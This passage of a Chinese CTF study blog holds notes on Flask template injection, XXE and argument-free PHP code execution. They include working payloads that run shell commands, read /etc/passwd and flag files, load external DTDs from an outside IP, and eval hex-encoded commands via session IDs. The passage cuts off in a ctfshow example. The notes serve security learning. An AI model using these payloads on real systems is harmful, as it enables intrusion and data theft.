class="name">&#x27;&#x27;.__class__.__bases__</span>[0].__subclasses__()[117].__init__.__globals__[&#x27;popen&#x27;](<span class="name">&#x27;ls /&#x27;</span>).read()&#125;&#125;</span></span><br></pre></td></tr></table></figure></p><h4 id="importlib类执行命令"><a href="#importlib类执行命令" class="headerlink" title="importlib类执行命令"></a>importlib类执行命令</h4><blockquote><p>python有一个importlib类，可用load<em>module来导入你需要的模块。<br>而<strong>frozen_importlib.BuiltinImporter</strong>类就可以提供 Python 中 import 语句的实现（以及 <em>_import</em></em> 函数）。我么可以直接利用该类中的load_module将os模块导入，从而使用 os 模块执行命令。</p></blockquote><p>payload:<br><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;<span class="name">[].__class__.__base__.__subclasses__</span>()[69][&quot;load_module&quot;](<span class="name">&quot;os&quot;</span>)[&quot;popen&quot;](<span class="name">&quot;ls /&quot;</span>).read()&#125;&#125;</span></span><br></pre></td></tr></table></figure></p><h4 id="linecache-函数执行命令"><a href="#linecache-函数执行命令" class="headerlink" title="linecache 函数执行命令"></a>linecache 函数执行命令</h4><blockquote><p>linecache 这个函数可用于读取任意一个文件的某一行，而这个函数中也引入了 os 模块.<br>所以我们也可以利用这个 linecache 函数去执行命令。</p></blockquote><p>payload:<br><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;<span class="name">[].__class__.__base__.__subclasses__</span>()[168].__init__.__globals__.linecache.os.popen(<span class="name">&#x27;ls /&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;<span class="name">[].__class__.__base__.__subclasses__</span>()[168].__init__.__globals__[&#x27;linecache&#x27;][&#x27;os&#x27;].popen(<span class="name">&#x27;ls /&#x27;</span>).read()&#125;&#125;</span></span><br></pre></td></tr></table></figure></p><h4 id="subprocess-Popen-类执行命令"><a href="#subprocess-Popen-类执行命令" class="headerlink" title="subprocess.Popen 类执行命令"></a>subprocess.Popen 类执行命令</h4><p>从python2.4版本开始，可以用 subprocess 这个模块来产生子进程，并连接到子进程的标准输入/输出/错误中去，还可以得到子进程的返回值。</p><p>subprocess 意在替代其他几个老的模块或者函数，比如：os.system、os.popen 等函数。</p><p>payload:<br><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;<span class="name">[].__class__.__base__.__subclasses__</span>()[245](<span class="name">&#x27;ls /&#x27;</span>,<span class="attr">shell</span>=<span class="literal">True</span>,<span class="attr">stdout</span>=-1).communicate()[0].strip()&#125;&#125;</span><span class="language-xml">  </span></span><br></pre></td></tr></table></figure></p><h2 id="未完待续"><a href="#未完待续" class="headerlink" title="未完待续"></a>未完待续</h2><p>参考:<br><a href="https://forum.butian.net/share/1371">flask SSTI学习与总结</a><br><a href="https://www.bilibili.com/video/BV1sc411979h">SSTI服务端模板注入</a><br><a href="https://xz.aliyun.com/t/3679?time__1311=n4%2BxnD0DBDgDc7D9DUO4BqOoT47KaW4WemD#toc-8">flask之ssti模版注入从零到入门</a></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE</title>
      <link href="/posts/xxe%5B6%5D.html"/>
      <url>/posts/xxe%5B6%5D.html</url>
      
        <content type="html"><![CDATA[<h2 id="认识XML"><a href="#认识XML" class="headerlink" title="认识XML"></a>认识XML</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>XML即 可扩展标记语言（EXtensible Markup Language），是一种标记语言，其标签没有预定义，您需要自行定义标签，是W3C的推荐标准。</p><h3 id="与HTML的区别"><a href="#与HTML的区别" class="headerlink" title="与HTML的区别"></a>与HTML的区别</h3><p>HTML 被设计用来显示数据<br>XML 被设计用来传输和存储数据</p><h3 id="基本格式"><a href="#基本格式" class="headerlink" title="基本格式"></a>基本格式</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--XML声明--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--DTD，这部分可选的--&gt;</span>          </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [ </span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///c:/windows/win.ini&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--文档元素--&gt;</span>                                                                          </span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><p>DTD：Document Type Definition 即文档类型定义，用来为XML文档定义语义约束。<br>1、内部DTD：即对XML文档中的元素、属性和实体的DTD的声明都在XML文档中。<br>2、外部DTD：即对XML文档中的元素、属性和实体的DTD的声明都在一个独立的DTD文件（.dtd）中。</p><h4 id="内部实体"><a href="#内部实体" class="headerlink" title="内部实体"></a>内部实体</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY a <span class="string">&quot;admin&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span>&amp;a<span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- admin --&gt;</span>#admin</span><br><span class="line"></span><br><span class="line">#<span class="meta">&lt;!ENTITY 实体名称 <span class="string">&quot;实体的值&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span>&gt;</span> [</span><br><span class="line">    <span class="meta">&lt;!ENTITY c <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>&gt;</span></span><br><span class="line">]&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span>&amp;c<span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- ZmxhZ3t0ZXN0fQ== --&gt;</span>#flag&#123;test&#125;</span><br><span class="line"></span><br><span class="line">#<span class="meta">&lt;!ENTITY 实体名称 <span class="keyword">SYSTEM</span> <span class="string">&quot;URI&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span>&gt;</span> [</span><br><span class="line">    <span class="meta">&lt;!ENTITY % b <span class="string">&quot;&lt;!ENTITY b1 &quot;</span>awsl<span class="string">&quot;&gt;&quot;</span>&gt;</span></span><br><span class="line">    %b;</span><br><span class="line">]&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span>&amp;b1<span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- awsl --&gt;</span>#awsl</span><br><span class="line"></span><br><span class="line">#<span class="meta">&lt;!ENTITY % 实体名称 <span class="string">&quot;实体的值&quot;</span>&gt;</span></span><br><span class="line">#<span class="meta">&lt;!ENTITY % 实体名称 <span class="keyword">SYSTEM</span> <span class="string">&quot;URI&quot;</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>参数实体用% name声明，引用时用%name;，只能在DTD中声明，DTD中引用。<br>其余实体直接用name声明，引用时用&name;，只能在DTD中声明，可在xml文档中引用</p><h4 id="外部参数实体"><a href="#外部参数实体" class="headerlink" title="外部参数实体"></a>外部参数实体</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span>&gt;</span> [</span><br><span class="line">    <span class="meta">&lt;!ENTITY % d <span class="keyword">SYSTEM</span> <span class="string">&quot;http://47.106.143.26/xml.dtd&quot;</span>&gt;</span></span><br><span class="line">    %d;</span><br><span class="line">]&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span>&amp;d1<span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line">#<span class="comment">&lt;!-- http://47.106.143.26/xml.dtd --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">d1</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;data://text/plain;base64,Y2w0eV9uZWVkX2FfZ3JpbGZyaWVuZA==&quot;</span>&gt;</span></span><br><span class="line">#<span class="comment">&lt;!-- Y2w0eV9uZWVkX2FfZ3JpbGZyaWVuZA== --&gt;</span></span><br><span class="line">#<span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span><span class="meta">&lt;!DOCTYPE a [    <span class="meta">&lt;!ENTITY % <span class="keyword">name</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span>    %name;]&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="认识XXE"><a href="#认识XXE" class="headerlink" title="认识XXE"></a>认识XXE</h2><h3 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h3><ol><li>XXE(XML External Entity Injection)全称为XML外部实体注入，由于程序在解析输入的XML数据时，解析了攻击者伪造的外部实体而产生的。例如PHP中的simplexml_load默认情况下会解析外部实体，有XXE漏洞的标志性函数为simplexml_load_string()。</li><li>一般xxe利用分为两大场景：有回显和无回显。有回显的情况可以直接在页面中看到Payload的执行结果或现象，无回显的情况又称为Blind XXE，可以使用外带数据通道提取数据。</li></ol><h3 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h3><h4 id="利用外部实体"><a href="#利用外部实体" class="headerlink" title="利用外部实体"></a>利用外部实体</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">rabbit</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;rabbit;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>123<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="利用外部参数实体"><a href="#利用外部参数实体" class="headerlink" title="利用外部参数实体"></a>利用外部参数实体</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://vps-ip/hack.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %file;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span><span class="symbol">&amp;hhh;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">hhh</span> <span class="keyword">SYSTEM</span> <span class="string">&#x27;file:///etc/passwd&#x27;</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h3><h2 id="未完待续"><a href="#未完待续" class="headerlink" title="未完待续"></a>未完待续</h2><p>参考：<br><a href="https://blog.csdn.net/weixin_44420143/article/details/118721145">XXE知识总结，有这篇就够了！</a><br><a href="https://www.cnblogs.com/20175211lyz/p/11413335.html">CTF XXE</a></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无参RCE</title>
      <link href="/posts/%E6%97%A0%E5%8F%82RCE%5B4%5D.html"/>
      <url>/posts/%E6%97%A0%E5%8F%82RCE%5B4%5D.html</url>
      
        <content type="html"><![CDATA[<h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><h3 id="目录操作"><a href="#目录操作" class="headerlink" title="目录操作"></a>目录操作</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">getchwd</span>() - 函数返回当前工作目录。</span><br><span class="line"><span class="title function_ invoke__">chdir</span>() - 函数改变当前的目录。</span><br><span class="line"><span class="title function_ invoke__">dirname</span>() - 函数返回路径中的目录部分。</span><br><span class="line"><span class="title function_ invoke__">scandir</span>() - 函数返回指定目录中的文件和目录的数组。</span><br><span class="line"><span class="title function_ invoke__">glob</span>() - 同上</span><br></pre></td></tr></table></figure><h3 id="数组操作"><a href="#数组操作" class="headerlink" title="数组操作"></a>数组操作</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">移动：</span><br><span class="line"><span class="title function_ invoke__">end</span>()   - 将内部指针指向数组中最后一个元素，并输出。</span><br><span class="line"><span class="title function_ invoke__">next</span>()  - 将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line"><span class="title function_ invoke__">prev</span>()  - 将内部指针指向数组中的上一个元素，并输出。</span><br><span class="line"><span class="title function_ invoke__">reset</span>() - 将内部指针指向数组中的第一个元素，并输出。</span><br><span class="line"><span class="title function_ invoke__">each</span>() - 返回当前元素的键名和键值，并将内部指针向前移动。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">current</span>() - 返回数组中的第一个单元</span><br><span class="line"><span class="title function_ invoke__">pos</span>() - 同上</span><br><span class="line"><span class="title function_ invoke__">strrev</span>() - 用于反转给定字符串</span><br><span class="line"><span class="title function_ invoke__">array_reverse</span>() - 将数组内容反转</span><br><span class="line"><span class="title function_ invoke__">localeconv</span>() - 返回一包含本地数字及货币格式信息的数组。（数组第一项是‘.’）</span><br><span class="line"><span class="title function_ invoke__">array_shift</span>() - 删除数组中第一个元素，并返回被删除元素的值。</span><br><span class="line"><span class="title function_ invoke__">array_flip</span>() - 交换数组中的键和值，成功时返回交换后的数组</span><br><span class="line"><span class="title function_ invoke__">array_rand</span>() - 从数组名中随机取出一个或多个单元</span><br></pre></td></tr></table></figure><h3 id="读文件操作"><a href="#读文件操作" class="headerlink" title="读文件操作"></a>读文件操作</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">readfile</span>() - 读取文件。</span><br><span class="line"><span class="title function_ invoke__">readgzfile</span>() - 可用于读取非 gzip 格式的文件</span><br><span class="line"><span class="title function_ invoke__">show_source</span>() - 显示文件(语法高亮)。</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>() - 显示文件(语法高亮)。</span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>() - 把整个文件读成一个字符串。</span><br></pre></td></tr></table></figure><h3 id="字符串操作"><a href="#字符串操作" class="headerlink" title="字符串操作"></a>字符串操作</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">hex2bin</span>() - 将<span class="number">16</span>进制转换为ASCII字符</span><br></pre></td></tr></table></figure><h3 id="打印操作"><a href="#打印操作" class="headerlink" title="打印操作"></a>打印操作</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span>() - 直接打印(不能打印数组和对象)</span><br><span class="line"><span class="title function_ invoke__">print_r</span>() - 直接打印(数组用结构表示)</span><br><span class="line"><span class="title function_ invoke__">var_export</span>() - 按类型直接打印内容(整数直接打印，字符(串)带上<span class="string">&#x27;&#x27;</span>打印)</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>() - 打印类型长度和内容</span><br><span class="line"><span class="title function_ invoke__">debug_zval_dump</span>() - 在<span class="title function_ invoke__">var_dump</span>()基础上多了点别的</span><br></pre></td></tr></table></figure><h2 id="利用session"><a href="#利用session" class="headerlink" title="利用session"></a>利用session</h2><h3 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cookie：PHPSESSID=要读的文件路径</span><br><span class="line"><span class="title function_ invoke__">readfile</span>(<span class="title function_ invoke__">session_id</span>(<span class="title function_ invoke__">session_start</span>()));</span><br><span class="line"><span class="comment">#开启会话并读取SESSID的内容，readfile可替换为其他读文件函数</span></span><br></pre></td></tr></table></figure><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注意PHPSESSIID中只能有A-Z;a-z;0-9，建议搭配字符串函数进行</span></span><br><span class="line"><span class="comment">#例如使用hex2bin() - 将16进制转换为字符串</span></span><br><span class="line">Cookie：PHPSESSID=命令(十六进制编码)</span><br><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">session_id</span>(<span class="title function_ invoke__">session_start</span>())));</span><br></pre></td></tr></table></figure><h2 id="利用getallheaders-apache环境"><a href="#利用getallheaders-apache环境" class="headerlink" title="利用getallheaders()(apache环境)"></a>利用getallheaders()(apache环境)</h2><blockquote><p>返回所有http头部信息</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">getallheaders</span>());数组打印所有头部信息</span><br><span class="line">改变某个头的内容为文件路径再用随机函数读取(多试几次)</span><br><span class="line"><span class="title function_ invoke__">readfile</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">getallheaders</span>())));</span><br><span class="line"><span class="comment">#命令执行同理</span></span><br></pre></td></tr></table></figure><h2 id="利用get-defined-vars"><a href="#利用get-defined-vars" class="headerlink" title="利用get_defined_vars()"></a>利用get_defined_vars()</h2><blockquote><p>数组形式返回所有当前已定义的变量（$_GET $_POST $_FILES $_COOKIE)</p></blockquote><p>uri/?a=/flag<br>然后print_r(get_defined_vars());可以看到a=/flag的位置<br><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Array</span> ( [_GET] =&gt; <span class="built_in">Array</span> ( [moran] =&gt; flag [a] =&gt; /flag ) [_POST] =&gt; <span class="built_in">Array</span> ( [flag] =&gt; please_give_me_flaG [task] =&gt; print_r(get_defined_vars()); ) [_COOKIE] =&gt; <span class="built_in">Array</span> ( ) [_FILES] =&gt; <span class="built_in">Array</span> ( ) [str1] =&gt; print_r(get_defined_vars()); [str2] =&gt; please_give_me_flaG )</span><br></pre></td></tr></table></figure><br><strong>这是一个大数组套着许多的小数组，例子中参数a在第一个数组里第二位<br>我们可用current或者reset来先从大数组里返回第一个小数组，然后使用next或者end来回显该小数组中第二个键的值</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">reset</span>(<span class="title function_ invoke__">get_defined_vars</span>())));回显:/flag</span><br><span class="line"><span class="title function_ invoke__">readfile</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">reset</span>(<span class="title function_ invoke__">get_defined_vars</span>()));读出/flag</span><br><span class="line">#命令执行同理</span><br></pre></td></tr></table></figure></p><h2 id="别的姿势"><a href="#别的姿势" class="headerlink" title="别的姿势"></a>别的姿势</h2><h4 id="localeconv"><a href="#localeconv" class="headerlink" title="localeconv()"></a>localeconv()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>());可以构造<span class="string">&#x27;.&#x27;</span>符号</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>()))); = ls</span><br></pre></td></tr></table></figure><h3 id="getcwd"><a href="#getcwd" class="headerlink" title="getcwd()"></a>getcwd()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">getcwd</span>());打印当前目录路径，例如/<span class="keyword">var</span>/www/html</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">getcwd</span>()));打印指定路径的目录，例如/<span class="keyword">var</span>/www</span><br><span class="line">继续结合<span class="title function_ invoke__">chdir</span>() - 改变当前目录</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>((<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">getcwd</span>()))));列出上一级目录文件名</span><br></pre></td></tr></table></figure><h3 id="其他payload"><a href="#其他payload" class="headerlink" title="其他payload"></a>其他payload</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">chdir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">getcwd</span>()))))))); </span><br><span class="line"><span class="comment">//读取上级目录文件</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">hebrevc</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">chdir</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>())))))))))));</span><br><span class="line"><span class="comment">//读取上级目录文件</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">hebrevc</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">chdir</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">hebrevc</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">phpversion</span>())))))))))))))));</span><br><span class="line"><span class="comment">//读取上级目录文件</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localtime</span>(<span class="title function_ invoke__">time</span>(<span class="title function_ invoke__">chdir</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>()))))))))))));</span><br><span class="line"><span class="comment">//这个得爆破</span></span><br></pre></td></tr></table></figure><h2 id="读取根目录"><a href="#读取根目录" class="headerlink" title="读取根目录"></a>读取根目录</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>())))所获得的字符串第一位有几率是/</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>()))))) = ls /</span><br></pre></td></tr></table></figure><h2 id="例题：ctfshow-web入门40"><a href="#例题：ctfshow-web入门40" class="headerlink" title="例题：ctfshow web入门40"></a>例题：ctfshow web入门40</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span 